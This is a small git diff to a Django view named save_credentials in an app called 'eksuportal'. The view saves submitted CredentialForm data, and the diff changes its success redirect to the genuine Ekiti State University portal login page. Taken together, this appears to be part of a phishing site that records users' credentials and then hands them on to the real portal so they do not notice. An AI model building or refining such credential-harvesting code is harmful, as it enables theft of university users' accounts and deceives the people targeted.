@@ -1,4 +1,5 @@
 from django.shortcuts import render, redirect
+from django.urls import reverse
 from . import forms
 
 
@@ -12,6 +13,6 @@ def save_credentials(request):
         new_cred = forms.CredentialForm(request.POST)
         if new_cred.is_valid():
             new_cred.save()
-            return redirect('eksuportal:login')
+            return redirect('https://eksuportal.eksu.edu.ng/login.php')
         else:
-            return redirect('eksuportal:login')
+            return redirect(reverse('eksuportal:login'))
